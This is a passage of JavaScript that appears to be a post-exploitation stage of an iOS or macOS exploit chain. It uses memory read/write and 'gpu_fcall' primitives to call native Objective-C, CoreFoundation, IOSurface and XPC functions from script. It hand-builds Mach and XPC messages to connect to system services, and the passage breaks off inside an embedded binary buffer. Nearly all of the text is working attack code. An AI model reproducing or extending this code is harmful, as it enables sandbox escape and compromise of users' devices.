  let IOCONNECTCALLSTRUCTMETHOD = func_resolve("IOConnectCallStructMethod");
  let OBJC_GETCLASS = func_resolve("objc_getClass");
  let OBJC_MSGSEND = func_resolve("objc_msgSend");
  let OBJC_ALLOC = func_resolve("objc_alloc");
  let OBJC_ALLOC_INIT = func_resolve("objc_alloc_init");
  let SEL_REGISTERNAME = func_resolve("sel_registerName");
  let CFDICTIONARYCREATEMUTABLE = func_resolve("CFDictionaryCreateMutable");
  let CFDICTIONARYSETVALUE = func_resolve("CFDictionarySetValue");
  let CFNUMBERCREATE = func_resolve("CFNumberCreate");
  let CFRELEASE = func_resolve("CFRelease");
  let CFSHOW = func_resolve("CFShow");
  let CFSTRINGCREATEWITHCSTRING = func_resolve("CFStringCreateWithCString");
  let IOSURFACECREATE = func_resolve("IOSurfaceCreate");
  let IOSURFACEGETBASEADDRESS = func_resolve("IOSurfaceGetBaseAddress");
  let IOSURFACEPREFETCHPAGES = func_resolve("IOSurfacePrefetchPages");
  let IOSURFACEGETID = func_resolve("IOSurfaceGetID");
  let kCFAllocatorDefault = uread64(func_resolve("kCFAllocatorDefault"));
  let kCFStringEncodingUTF8 = 0x08000100n;
  let kCFTypeDictionaryKeyCallBacks = func_resolve("kCFTypeDictionaryKeyCallBacks");
  let kCFTypeDictionaryValueCallBacks = func_resolve("kCFTypeDictionaryValueCallBacks");
  let kIOSurfaceAllocSize = uread64(func_resolve("kIOSurfaceAllocSize"));
  let selector_evaluateScript = sel_registerName(get_cstring("evaluateScript:"));
  let selector_initWithTarget_selector_object = sel_registerName(get_cstring("initWithTarget:selector:object:"));
  let selector_invocationWithMethodSignature = sel_registerName(get_cstring("invocationWithMethodSignature:"));
  let selector_invoke = sel_registerName(get_cstring("invoke"));
  let selector_isFinished = sel_registerName(get_cstring("isFinished"));
  let selector_methodSignatureForSelector = sel_registerName(get_cstring("methodSignatureForSelector:"));
  let selector_objectForKeyedSubscript = sel_registerName(get_cstring("objectForKeyedSubscript:"));
  let selector_release = sel_registerName(get_cstring("release"));
  let selector_retainCount = sel_registerName(get_cstring("retainCount"));
  let selector_setArgument_atIndex = sel_registerName(get_cstring("setArgument:atIndex:"));
  let selector_start = sel_registerName(get_cstring("start"));
  let cfstr_boxed_arr = create_cfstring(get_cstring("boxed_arr"));
  let cfstr_control_array = create_cfstring(get_cstring("control_array"));
  let cfstr_control_array_8 = create_cfstring(get_cstring("control_array_8"));
  let cfstr_func_offsets_array = create_cfstring(get_cstring("func_offsets_array"));
  let cfstr_isNaN = create_cfstring(get_cstring("isNaN"));
  let cfstr_rw_array = create_cfstring(get_cstring("rw_array"));
  let cfstr_rw_array_8 = create_cfstring(get_cstring("rw_array_8"));
  let cfstr_unboxed_arr = create_cfstring(get_cstring("unboxed_arr"));
  let invoke_class = objc_getClass("NSInvocation");
  let jsc_class = objc_getClass("JSContext");
  let nsthread_class = objc_getClass("NSThread");
  let XPC_RETAIN = func_resolve("xpc_retain");
  let XPC_BOOL_CREATE = func_resolve("xpc_bool_create");
  let XPC_RELEASE = func_resolve("xpc_release");
  let XPC_CONNECTION_CREATE_MACH_SERVICE = func_resolve("xpc_connection_create_mach_service");
  let XPC_CONNECTION_CANCEL = func_resolve("xpc_connection_cancel");
  let XPC_CONNECTION_SET_EVENT_HANDLER = func_resolve("xpc_connection_set_event_handler");
  let XPC_CONNECTION_ACTIVATE = func_resolve("xpc_connection_activate");
  let XPC_CONNECTION_SEND_MESSAGE_WITH_REPLY_SYNC = func_resolve("xpc_connection_send_message_with_reply_sync");
  let XPC_DICTIONARY_CREATE_EMPTY = func_resolve("xpc_dictionary_create_empty");
  let XPC_DICTIONARY_SET_VALUE = func_resolve("xpc_dictionary_set_value");
  let XPC_DICTIONARY_GET_UINT64 = func_resolve("xpc_dictionary_get_uint64");
  let XPC_DICTIONARY_SET_UINT64 = func_resolve("xpc_dictionary_set_uint64");
  let XPC_DICTIONARY_GET_INT64 = func_resolve("xpc_dictionary_get_int64");
  let XPC_ARRAY_CREATE_EMPTY = func_resolve("xpc_array_create_empty");
  let XPC_ARRAY_APPEND_VALUE = func_resolve("xpc_array_append_value");
  let XPC_UINT64_CREATE = func_resolve("xpc_uint64_create");
  let XPC_INT64_CREATE = func_resolve("xpc_int64_create");
  let XPC_DATA_CREATE = func_resolve("xpc_data_create");
  let XPC_DATA_CREATE_WITH_DISPATCH_DATA = func_resolve("xpc_data_create_with_dispatch_data");
  let XPC_STRING_CREATE = func_resolve("xpc_string_create");
  let XPC_UUID_CREATE = func_resolve("xpc_uuid_create");
  let XPC_NULL_CREATE = func_resolve("xpc_null_create");
  let XPC_ENDPOINT_CREATE = func_resolve("xpc_endpoint_create");
  let XPC_ENDPOINT_DISPOSE = func_resolve("xpc_endpoint_dispose");
  let XPC_CONNECTION_SEND_MESSAGE_WITH_REPLY = func_resolve("xpc_connection_send_message_with_reply");
  let IOSURFACE_CREATE_XPC_OBJECT = func_resolve("IOSurfaceCreateXPCObject");
  let MIG_GET_REPLY_PORT = func_resolve("mig_get_reply_port");
  let DISPATCH_DATA_CREATE = func_resolve("dispatch_data_create");
  function xpc_retain(object) {
    return gpu_fcall(XPC_RETAIN, object);
  }
  function xpc_bool_create(value) {
    return gpu_fcall(XPC_BOOL_CREATE, value);
  }
  function xpc_release(object) {
    return gpu_fcall(XPC_RELEASE, object);
  }
  function xpc_connection_cancel(object) {
    return gpu_fcall(XPC_CONNECTION_CANCEL, object);
  }
  function xpc_connection_create_mach_service(x0, x1, x2) {
    if (typeof x0 === "string") {
      x0 = get_cstring(x0);
    }
    return gpu_fcall(XPC_CONNECTION_CREATE_MACH_SERVICE, x0, x1, x2);
  }
  function xpc_connection_set_event_handler(x0, x1) {
    return gpu_fcall(XPC_CONNECTION_SET_EVENT_HANDLER, x0, x1);
  }
  function xpc_connection_activate(x0) {
    return gpu_fcall(XPC_CONNECTION_ACTIVATE, x0);
  }
  function xpc_connection_send_message_with_reply_sync(connection, message) {
    return gpu_fcall(XPC_CONNECTION_SEND_MESSAGE_WITH_REPLY_SYNC, connection, message);
  }
  function xpc_dictionary_create_empty() {
    return gpu_fcall(XPC_DICTIONARY_CREATE_EMPTY);
  }
  function xpc_dictionary_set_value(dict, key, value) {
    if (typeof key === "string") {
      key = get_cstring(key);
    }
    return gpu_fcall(XPC_DICTIONARY_SET_VALUE, dict, key, value);
  }
  function xpc_dictionary_get_uint64(dict, key) {
    if (typeof key === "string") {
      key = get_cstring(key);
    }
    return gpu_fcall(XPC_DICTIONARY_GET_UINT64, dict, key);
  }
  function xpc_dictionary_set_uint64(dict, key, value) {
    if (typeof key === "string") {
      key = get_cstring(key);
    }
    return gpu_fcall(XPC_DICTIONARY_SET_UINT64, dict, key, value);
  }
  function xpc_dictionary_get_int64(dict, key) {
    if (typeof key === "string") {
      key = get_cstring(key);
    }
    return gpu_fcall(XPC_DICTIONARY_GET_INT64, dict, key);
  }
  function xpc_array_create_empty() {
    return gpu_fcall(XPC_ARRAY_CREATE_EMPTY);
  }
  function xpc_array_append_value(array, value) {
    return gpu_fcall(XPC_ARRAY_APPEND_VALUE, array, value);
  }
  function xpc_uint64_create(value) {
    if (typeof value == "number") {
      value = BigInt(value);
    }
    return gpu_fcall(XPC_UINT64_CREATE, value);
  }
  function xpc_int64_create(value) {
    if (typeof value == "number") {
      value = BigInt(value);
    }
    return gpu_fcall(XPC_INT64_CREATE, value);
  }
  function xpc_data_create(bytes, length) {
    return gpu_fcall(XPC_DATA_CREATE, bytes, length);
  }
  function xpc_data_create_with_dispatch_data(ddata) {
    return gpu_fcall(XPC_DATA_CREATE_WITH_DISPATCH_DATA, ddata);
  }
  function xpc_string_create(string) {
    if (typeof string === "string") {
      string = get_cstring(string);
    }
    return gpu_fcall(XPC_STRING_CREATE, string);
  }
  function xpc_uuid_create(uuid) {
    if (typeof uuid === "object") {
      uuid = wc_uread64(addrof(uuid).add(0x10n));
    }
    if (integrated) {
      uuid = gpuCopyBuffer(uuid, 0x10n);
    }
    return gpu_fcall(XPC_UUID_CREATE, uuid);
  }
  function xpc_null_create() {
    return gpu_fcall(XPC_NULL_CREATE);
  }
  function xpc_endpoint_create(conn) {
    return gpu_fcall(XPC_ENDPOINT_CREATE, conn);
  }
  function xpc_endpoint_dispose(conn) {
    return gpu_fcall(XPC_ENDPOINT_DISPOSE, conn);
  }
  function xpc_connection_send_message_with_reply(a, b, c, d) {
    return gpu_fcall(XPC_CONNECTION_SEND_MESSAGE_WITH_REPLY, a, b, c, d);
  }
  function IOSurfaceCreateXPCObject(surface) {
    return gpu_fcall(IOSURFACE_CREATE_XPC_OBJECT, surface);
  }
  function mig_get_reply_port() {
    return gpu_fcall(MIG_GET_REPLY_PORT);
  }
  function dispatch_data_create(buffer, size, queue, destructor) {
    return gpu_fcall(DISPATCH_DATA_CREATE, buffer, size, queue, destructor);
  }
  let MACH_MSG_TIMEOUT_NONE = 0n;
  let MACH_PORT_RIGHT_SEND = 0n;
  let MACH_PORT_RIGHT_RECEIVE = 1n;
  let MACH_PORT_RIGHT_SEND_ONCE = 2n;
  let MACH_PORT_RIGHT_PORT_SET = 3n;
  let MACH_PORT_RIGHT_DEAD_NAME = 4n;
  let MACH_PORT_RIGHT_LABELH = 5n;
  let MACH_PORT_RIGHT_NUMBER = 6n;
  let MACH_MSG_TYPE_MOVE_RECEIVE = 16n;
  let MACH_MSG_TYPE_MOVE_SEND = 17n;
  let MACH_MSG_TYPE_MOVE_SEND_ONCE = 18n;
  let MACH_MSG_TYPE_COPY_SEND = 19n;
  let MACH_MSG_TYPE_MAKE_SEND = 20n;
  let MACH_MSG_TYPE_MAKE_SEND_ONCE = 21n;
  let MACH_MSG_TYPE_COPY_RECEIVE = 22n;
  let MACH_MSG_TYPE_DISPOSE_RECEIVE = 24n;
  let MACH_MSG_TYPE_DISPOSE_SEND = 25n;
  let MACH_MSG_TYPE_DISPOSE_SEND_ONCE = 26n;
  let MACH_MSG_PORT_DESCRIPTOR = 0n;
  let MACH_MSG_OOL_DESCRIPTOR = 1n;
  let MACH_MSG_OOL_PORTS_DESCRIPTOR = 2n;
  let MACH_MSG_OOL_VOLATILE_DESCRIPTOR = 3n;
  let MACH_MSG_GUARDED_PORT_DESCRIPTOR = 4n;
  let MACH_MSG_OPTION_NONE = 0x00000000n;
  let MACH_MSG_STRICT_REPLY = 0x00000200n;
  let MACH_SEND_MSG = 0x00000001n;
  let MACH_RCV_MSG = 0x00000002n;
  let MACH_RCV_LARGE = 0x00000004n;
  let MACH_RCV_LARGE_IDENTITY = 0x00000008n;
  let MACH_SEND_TIMEOUT = 0x00000010n;
  let MACH_SEND_OVERRIDE = 0x00000020n;
  let MACH_SEND_INTERRUPT = 0x00000040n;
  let MACH_SEND_NOTIFY = 0x00000080n;
  let MACH_SEND_ALWAYS = 0x00010000n;
  let MACH_SEND_FILTER_NONFATAL = 0x00010000n;
  let MACH_SEND_TRAILER = 0x00020000n;
  let MACH_SEND_NOIMPORTANCE = 0x00040000n;
  let MACH_SEND_NODENAP = null && MACH_SEND_NOIMPORTANCE;
  let MACH_SEND_IMPORTANCE = 0x00080000n;
  let MACH_SEND_SYNC_OVERRIDE = 0x00100000n;
  let MACH_SEND_PROPAGATE_QOS = 0x00200000n;
  let MACH_SEND_SYNC_USE_THRPRI = null && MACH_SEND_PROPAGATE_QOS;
  let MACH_SEND_KERNEL = 0x00400000n;
  let MACH_SEND_SYNC_BOOTSTRAP_CHECKIN = 0x00800000n;
  let MACH_RCV_TIMEOUT = 0x00000100n;
  let MACH_RCV_NOTIFY = 0x00000000n;
  let MACH_RCV_INTERRUPT = 0x00000400n;
  let MACH_RCV_VOUCHER = 0x00000800n;
  let MACH_RCV_OVERWRITE = 0x00000000n;
  let MACH_RCV_GUARDED_DESC = 0x00001000n;
  let MACH_RCV_SYNC_WAIT = 0x00004000n;
  let MACH_RCV_SYNC_PEEK = 0x00008000n;
  let MACH_MSGH_BITS_ZERO = 0x00000000n;
  let MACH_MSGH_BITS_REMOTE_MASK = 0x0000001fn;
  let MACH_MSGH_BITS_LOCAL_MASK = 0x00001f00n;
  let MACH_MSGH_BITS_VOUCHER_MASK = 0x001f0000n;
  let MACH_MSGH_BITS_PORTS_MASK = MACH_MSGH_BITS_REMOTE_MASK | MACH_MSGH_BITS_LOCAL_MASK | MACH_MSGH_BITS_VOUCHER_MASK;
  let MACH_MSGH_BITS_COMPLEX = 0x80000000n;
  let MACH_MSGH_BITS_USER = 0x801f1f1fn;
  let MACH_MSGH_BITS_RAISEIMP = 0x20000000n;
  let MACH_MSGH_BITS_DENAP = null && MACH_MSGH_BITS_RAISEIMP;
  let MACH_MSGH_BITS_IMPHOLDASRT = 0x10000000n;
  let MACH_MSGH_BITS_DENAPHOLDASRT = null && MACH_MSGH_BITS_IMPHOLDASRT;
  let MACH_MSGH_BITS_CIRCULAR = 0x10000000n;
  let MACH_MSGH_BITS_USED = 0xb01f1f1fn;
  let MACH_MSG_PHYSICAL_COPY = 0n;
  let MACH_MSG_VIRTUAL_COPY = 1n;
  let MACH_MSG_ALLOCATE = 2n;
  let MACH_MSG_OVERWRITE = 3n;
  let MACH_MSG_KALLOC_COPY_T = 4n;
  let MACH_SEND_TIMED_OUT = 0x10000004n;
  function MACH_MSGH_BITS(remote, local) {
    return remote | local << 8n;
  }
  function MACH_MSGH_BITS_SET_PORTS(remote, local, voucher) {
    return remote & MACH_MSGH_BITS_REMOTE_MASK | local << 8n & MACH_MSGH_BITS_LOCAL_MASK | voucher << 16n & MACH_MSGH_BITS_VOUCHER_MASK;
  }
  function MACH_MSGH_BITS_SET(remote, local, voucher, other) {
    return MACH_MSGH_BITS_SET_PORTS(remote, local, voucher) | other & ~MACH_MSGH_BITS_PORTS_MASK;
  }
  let mach_msg_header_t = {
    "msgh_bits": [UINT32_BITSIZE, 0x0n],
    "msgh_size": [UINT32_BITSIZE, 0x4n],
    "msgh_remote_port": [UINT32_BITSIZE, 0x8n],
    "msgh_local_port": [UINT32_BITSIZE, 0xcn],
    "msgh_voucher_port": [UINT32_BITSIZE, 0x10n],
    "msgh_id": [UINT32_BITSIZE, 0x14n],
    "_size": 0x18n
  };
  let mach_msg_body_t = {
    "msgh_descriptor_count": [UINT32_BITSIZE, 0x0n],
    "_size": 0x4n
  };
  let mach_msg_port_descriptor_t = {
    "name": [UINT32_BITSIZE, 0x0n],
    "pad1": [UINT32_BITSIZE, 0x4n],
    "pad2": [UINT16_BITSIZE, 0x8n],
    "disposition": [UINT8_BITSIZE, 0xan],
    "type": [UINT8_BITSIZE, 0xbn],
    "_size": 0xcn
  };
  let mach_msg_ool_descriptor_t = {
    "address": [UINT64_BITSIZE, 0x0n],
    "deallocate": [UINT8_BITSIZE, 0x8n],
    "copy": [UINT8_BITSIZE, 0x9n],
    "pad1": [UINT8_BITSIZE, 0xan],
    "type": [UINT8_BITSIZE, 0xbn],
    "size": [UINT32_BITSIZE, 0xcn],
    "_size": 0x10n
  };
  function mach_msg_header_set(msg, field, val) {
    struct_field_set(mach_msg_header_t, msg, field, val);
  }
  function mach_msg_body_set(msg, field, val) {
    struct_field_set(mach_msg_body_t, msg, field, val);
  }
  function mach_msg_port_descriptor_set(msg, field, val) {
    struct_field_set(mach_msg_port_descriptor_t, msg, field, val);
  }
  function mach_msg_ool_descriptor_set(msg, field, val) {
    struct_field_set(mach_msg_ool_descriptor_t, msg, field, val);
  }
  let OXPC_TYPE_NULL = 0x1000n;
  let OXPC_TYPE_BOOL = 0x2000n;
  let OXPC_TYPE_INT64 = 0x3000n;
  let OXPC_TYPE_UINT64 = 0x4000n;
  let OXPC_TYPE_DATA = 0x8000n;
  let OXPC_TYPE_OOL_DATA = 0x8001n;
  let OXPC_TYPE_STRING = 0x9000n;
  let OXPC_TYPE_UUID = 0xa000n;
  let OXPC_TYPE_MACH_SEND = 0xd000n;
  let OXPC_TYPE_ARRAY = 0xe000n;
  let OXPC_TYPE_DICTIONARY = 0xf000n;
  let OXPC_TYPE_INVALID = 0xbaadn;
  let oxpc_arbitrary_size_limit = 0x50000000;
  function round_up_32(base, unit) {
    return base + (unit - 1n) & ~(unit - 1n);
  }
  let oxpc_dictionary_serialized_t = {
    "type": [UINT32_BITSIZE, 0x0n],
    "byte_count": [UINT32_BITSIZE, 0x4n],
    "count": [UINT32_BITSIZE, 0x8n],
    "_size": 0xcn
  };
  let oxpc_null_t = {
    "type": [UINT32_BITSIZE, 0x0n],
    "_size": 0x4n
  };
  function xpcjs_lookup(service_name) {
    let service_port_ptr = new_uint64_t();
    let bootstrap_port = 0x807n;
    let kr = bootstrap_look_up(bootstrap_port, get_cstring(service_name), service_port_ptr);
    if (kr != KERN_SUCCESS) {
      return MACH_PORT_NULL;
    }
    let service_port = uread32(service_port_ptr);
    if (service_port == MACH_PORT_NULL) {
      return MACH_PORT_NULL;
    }
    return service_port;
  }
  function xpcjs_xpc_checkin(service_port, client_port_addr, reply_port_addr) {
    let kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, client_port_addr);
    if (kr != KERN_SUCCESS) {
      return kr;
    }
    kr = mach_port_insert_right(mach_task_self(), uread32(client_port_addr), uread32(client_port_addr), MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
      return kr;
    }
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, reply_port_addr);
    if (kr != KERN_SUCCESS) {
      return kr;
    }
    let msg_sz = mach_msg_header_t["_size"] + mach_msg_body_t["_size"] + mach_msg_port_descriptor_t["_size"] * 0x2n;
    let msg = calloc(1n, msg_sz);
    let hdr = msg;
    mach_msg_header_set(hdr, "msgh_bits", MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0n, 0n, MACH_MSGH_BITS_COMPLEX));
    mach_msg_header_set(hdr, "msgh_size", msg_sz);
    mach_msg_header_set(hdr, "msgh_remote_port", service_port);
    mach_msg_header_set(hdr, "msgh_id", 0x77303074n);
    let body = msg + mach_msg_header_t["_size"];
    mach_msg_body_set(body, "msgh_descriptor_count", 2n);
    let port_0 = body + mach_msg_body_t["_size"];
    mach_msg_port_descriptor_set(port_0, "name", uread32(client_port_addr));
    mach_msg_port_descriptor_set(port_0, "disposition", MACH_MSG_TYPE_MOVE_RECEIVE);
    mach_msg_port_descriptor_set(port_0, "type", MACH_MSG_PORT_DESCRIPTOR);
    let port_1 = port_0 + mach_msg_port_descriptor_t["_size"];
    mach_msg_port_descriptor_set(port_1, "name", uread32(reply_port_addr));
    mach_msg_port_descriptor_set(port_1, "disposition", MACH_MSG_TYPE_MAKE_SEND);
    mach_msg_port_descriptor_set(port_1, "type", MACH_MSG_PORT_DESCRIPTOR);
    kr = mach_msg(msg, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, msg_sz, 0n, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
      return kr;
    }
    return KERN_SUCCESS;
  }
  function xpcjs_xpc_connect(service_name) {
    let connection = {};
    connection["client_port"] = new_uint64_t();
    connection["reply_port"] = new_uint64_t();
    let service_port = xpcjs_lookup(service_name);
    let kr = xpcjs_xpc_checkin(service_port, connection["client_port"], connection["reply_port"]);
    mach_port_deallocate(mach_task_self(), service_port);
    if (kr != KERN_SUCCESS) {
      LOG(`Failed to connect to ${service_name}, kr: ${kr.hex()}`);
      return null;
    }
    connection["client_port"] = uread32(connection["client_port"]);
    connection["reply_port"] = uread32(connection["reply_port"]);
    return connection;
  }
  function oxpc_check_type(obj, type) {
    if (obj["type"] != type) {
      ERROR(`type mismatch: ${type} ${obj["type"]}`);
    }
  }
  function oxpc_dictionary_alloc() {
    let dict = {};
    dict["type"] = OXPC_TYPE_DICTIONARY;
    dict["count"] = 0n;
    dict["serialized_size"] = 0n;
    dict["keys"] = [];
    dict["values"] = [];
    return dict;
  }
  function oxpc_null_alloc() {
    let obj = {};
    obj["type"] = OXPC_TYPE_NULL;
    return obj;
  }
  function oxpc_dictionary_append(dict, key, value) {
    oxpc_check_type(dict, OXPC_TYPE_DICTIONARY);
    if (dict["count"] > oxpc_arbitrary_size_limit) {
      ERROR("oxpc dictionary grew too large");
    }
    dict["count"] += 0x1n;
    dict["keys"].push(strdup(key));
    dict["values"].push(value);
  }
  function oxpc_dictionary_type_descriptor() {
    let desc = {};
    desc["serialized_size"] = function (dict) {
      oxpc_check_type(dict, OXPC_TYPE_DICTIONARY);
      if (dict["serialized_size"] != 0n) {
        return dict["serialized_size"];
      }
      let total = 0n;
      for (let i = 0n; i < dict["count"]; i++) {
        let key_size = round_up_32(strlen(dict["keys"][i]) + 1n, 4n);
        let value_size = oxpc_object_serialized_size(dict["values"][i]);
        if (key_size > oxpc_arbitrary_size_limit) {
          ERROR("dictionary key too large for serialization");
        }
        if (value_size > oxpc_arbitrary_size_limit) {
          ERROR("dictionary value too large for serialization");
        }
        if (total > oxpc_arbitrary_size_limit) {
          ERROR("dictionary too large for serialization");
        }
        total += key_size + value_size;
      }
      dict["serialized_size"] = oxpc_dictionary_serialized_t["_size"] + total;
      return dict["serialized_size"];
    };
    desc["serialize_to_buffer"] = function (dict, buffer, ports) {
      oxpc_check_type(dict, OXPC_TYPE_DICTIONARY);
      let serialized_dict = buffer;
      struct_field_set(oxpc_dictionary_serialized_t, serialized_dict, "type", dict["type"]);
      struct_field_set(oxpc_dictionary_serialized_t, serialized_dict, "byte_count", oxpc_object_serialized_size(dict) - 0x8n);
      struct_field_set(oxpc_dictionary_serialized_t, serialized_dict, "count", dict["count"]);
      let dict_buffer = serialized_dict + oxpc_dictionary_serialized_t["_size"];
      for (let i = 0n; i < dict["count"]; i++) {
        let key_size = strlen(dict["keys"][i]) + 1n;
        memcpy(dict_buffer, dict["keys"][i], key_size);
        key_size = round_up_32(key_size, 4n);
        dict_buffer += key_size;
        let value_size = oxpc_object_serialized_size(dict["values"][i]);
        oxpc_object_serialize_to_buffer(dict["values"][i], dict_buffer, ports);
        dict_buffer += value_size;
      }
    };
    return desc;
  }
  function oxpc_null_type_descriptor() {
    let desc = {};
    desc["serialized_size"] = function (obj) {
      oxpc_check_type(obj, OXPC_TYPE_NULL);
      return oxpc_null_t["_size"];
    };
    desc["serialize_to_buffer"] = function (obj, buffer, ports) {
      oxpc_check_type(obj, OXPC_TYPE_NULL);
      uwrite_bitsize(buffer, OXPC_TYPE_NULL, 32n);
    };
    return desc;
  }
  function oxpc_get_type_descriptor(obj) {
    switch (obj["type"]) {
      case OXPC_TYPE_STRING:
        return oxpc_string_type_descriptor;
      case OXPC_TYPE_INT64:
        return oxpc_int64_type_descriptor;
      case OXPC_TYPE_UINT64:
        return oxpc_uint64_type_descriptor;
      case OXPC_TYPE_ARRAY:
        return oxpc_array_type_descriptor;
      case OXPC_TYPE_DICTIONARY:
        return oxpc_dictionary_type_descriptor();
      case OXPC_TYPE_OOL_DATA:
        return oxpc_ool_data_type_descriptor;
      case OXPC_TYPE_UUID:
        return oxpc_uuid_type_descriptor;
      case OXPC_TYPE_MACH_SEND:
        return oxpc_mach_send_type_descriptor;
      case OXPC_TYPE_DATA:
        return oxpc_data_type_descriptor;
      case OXPC_TYPE_NULL:
        return oxpc_null_type_descriptor();
      case OXPC_TYPE_INVALID:
        return oxpc_invalid_type_descriptor;
      default:
        ERROR("unrecognized oxpc type");
    }
    return NULL;
  }
  function oxpc_object_serialized_size(obj) {
    let desc = oxpc_get_type_descriptor(obj);
    return desc["serialized_size"](obj);
  }
  function oxpc_object_serialize_to_buffer(obj, buffer, ports) {
    oxpc_get_type_descriptor(obj)["serialize_to_buffer"](obj, buffer, ports);
  }
  function oxpc_port_list_alloc() {
    let list = {};
    list["count"] = 0n;
    list["ports"] = [];
    return list;
  }
  function oxpc_port_list_append(list, port) {
    if (list["count"] > oxpc_arbitrary_size_limit) {
      ERROR("oxpc_ports_list too large");
    }
    list["count"] += 0x1n;
    list["ports"].push(port);
  }
  function oxpc_object_serialize_with_header(obj) {
    let total_size = oxpc_object_serialized_size(obj);
    if (total_size > oxpc_arbitrary_size_limit) {
      ERROR("oxpc object too large to be serialized");
    }
    total_size += 8n;
    let buffer = calloc(1n, total_size);
    if (buffer == NULL) {
      ERROR("unable to allocate memory for serialized oxpc object");
    }
    memset(buffer, 0n, total_size);
    uwrite_bitsize(buffer, 0x40585043n, 32n);
    uwrite_bitsize(buffer + 0x4n, 0x5n, 32n);
    let ports = oxpc_port_list_alloc();
    oxpc_object_serialize_to_buffer(obj, buffer + 0x8n, ports);
    return {
      "buffer": buffer,
      "total_size": total_size,
      "ports": ports
    };
  }
  function oxpc_build_mach_message(serialized_payload, serialized_payload_size, body_ool, port_list, destination_port, reply_port) {
    let is_complex_message = false;
    if (port_list["count"] > 0n || body_ool) {
      is_complex_message = true;
    }
    let msg_body_size = mach_msg_header_t["_size"];
    if (is_complex_message) {
      msg_body_size += mach_msg_body_t["_size"];
    }
    if (body_ool != 0n) {
      msg_body_size += mach_msg_ool_descriptor_t["_size"];
    }
    if (is_complex_message) {
      msg_body_size += port_list["count"] * mach_msg_port_descriptor_t["_size"];
    }
    if (body_ool == 0n) {
      msg_body_size += serialized_payload_size;
    }
    let message = calloc(1n, msg_body_size + 0x100n);
    if (message == NULL) {
      ERROR("not enough memory to allocate mach message");
    }
    let hdr = message;
    let destination_disposition = 0n;
    if (destination_port != MACH_PORT_NULL) {
      destination_disposition = MACH_MSG_TYPE_COPY_SEND;
    }
    let reply_disposition = 0n;
    if (reply_port != MACH_PORT_NULL) {
      reply_disposition = MACH_MSG_TYPE_MAKE_SEND_ONCE;
    }
    let flag = 0n;
    if (is_complex_message) {
      flag = MACH_MSGH_BITS_COMPLEX;
    }
    mach_msg_header_set(hdr, "msgh_bits", MACH_MSGH_BITS_SET(destination_disposition, reply_disposition, 0n, flag));
    mach_msg_header_set(hdr, "msgh_size", msg_body_size);
    mach_msg_header_set(hdr, "msgh_remote_port", destination_port);
    mach_msg_header_set(hdr, "msgh_local_port", reply_port);
    mach_msg_header_set(hdr, "msgh_voucher_port", MACH_PORT_NULL);
    mach_msg_header_set(hdr, "msgh_id", 0x10000000n);
    let message_body = hdr + mach_msg_header_t["_size"];
    ;
    if (is_complex_message) {
      let body = message_body;
      mach_msg_body_set(body, "msgh_descriptor_count", port_list["count"]);
      if (body_ool != 0n) {
        mach_msg_body_set(body, "msgh_descriptor_count", port_list["count"] + 0x1n);
      }
      let next = body + mach_msg_body_t["_size"];
      if (body_ool != 0n) {
        let desc = next;
        mach_msg_ool_descriptor_set(desc, "address", serialized_payload);
        mach_msg_ool_descriptor_set(desc, "copy", MACH_MSG_VIRTUAL_COPY);
        mach_msg_ool_descriptor_set(desc, "deallocate", 0n);
        mach_msg_ool_descriptor_set(desc, "size", serialized_payload_size);
        mach_msg_ool_descriptor_set(desc, "type", MACH_MSG_OOL_DESCRIPTOR);
        next = desc + mach_msg_ool_descriptor_t["_size"];
      }
      let desc = next;
      for (let i = 0n; i < port_list["count"]; i++) {
        mach_msg_port_descriptor_set(desc, "name", port_list["ports"][i]);
        mach_msg_port_descriptor_set(desc, "disposition", MACH_MSG_TYPE_COPY_SEND);
        mach_msg_port_descriptor_set(desc, "type", MACH_MSG_PORT_DESCRIPTOR);
        desc += mach_msg_port_descriptor_t["_size"];
      }
      message_body = desc;
    }
    if (body_ool == 0n) {
      memcpy(message_body, serialized_payload, serialized_payload_size);
    }
    return {
      "message": message,
      "message_size": msg_body_size
    };
  }
  let sample_buffer_data = new Uint8Array([0x84, 0x6, 0x0, 0x0, 0x66, 0x75, 0x62, 0x73, 0x8, 0x2, 0x0, 0x0, 0x74, 0x61, 0x64, 0x73, 0xb4, 0x97, 0xc7, 0x25, 0x0, 0xbb, 0xd9, 0x7, 0x4, 0xa6, 0x8f, 0x43, 0x90, 0x90, 0xdd, 0xc4, 0xd1, 0xdc, 0x6d, 0x79, 0xb6, 0x44, 0x1c, 0xea, 0xa7, 0xe6, 0x5e, 0x1d, 0x11, 0x68, 0x27, 0x59, 0xa2, 0x51, 0xde, 0x7e, 0x32, 0xc5, 0x62, 0x93, 0x11, 0xe2, 0xed, 0x44, 0xb9, 0xa2, 0xe8, 0x73, 0x1, 0x24, 0x94, 0x80, 0x20, 0xc1, 0x9f, 0x5, 0xd3, 0x35, 0xf0, 0xc9, 0x62, 0x7c, 0xfb, 0xa7, 0x32, 0xe7, 0x8c, 0x5f, 0x56, 0xf7, 0x8e, 0x8d, 0xb4, 0x3e, 0x45, 0xe0, 0xf3, 0x81, 0xfa, 0x96, 0x4c, 0xd7, 0xa8, 0x33, 0x61, 0x7e, 0x8, 0x22, 0xe9, 0x9e, 0x5c, 0x52, 0xfe, 0xcb, 0x51, 0x17, 0x6a, 0xa4, 0xe, 0xe7, 0xd, 0x84, 0xd1, 0x8b, 0x33, 0xce, 0xed, 0xae, 0xcc, 0xbe, 0x84, 0xfe, 0x38, 0x7f, 0x9a, 0x96, 0xfa, 0x7c, 0x7b, 0xc, 0xd6, 0x1e, 0x84, 0xd4, 0x87, 0xcb, 0x80, 0xd2, 0x9f, 0xe9, 0x5c, 0x61, 0x1f, 0x5a, 0x96, 0xff, 0x3a, 0xd, 0x4, 0x1c, 0x99, 0x86, 0x47, 0xb1, 0xfe, 0x42, 0x52, 0x1f, 0xe0, 0x50, 0x17, 0x64, 0xaf, 0x92, 0x7, 0xe3, 0x88, 0x7a, 0x19, 0x1a, 0x47, 0x16, 0x60, 0x51, 0x1, 0xea, 0x66, 0x50, 0x86, 0xda, 0x2c, 0x4c, 0x46, 0x56, 0xbb, 0x7d, 0xf7, 0x51, 0x76, 0xf7, 0xff, 0xc, 0x9b, 0x7e, 0x84, 0x66, 0xed, 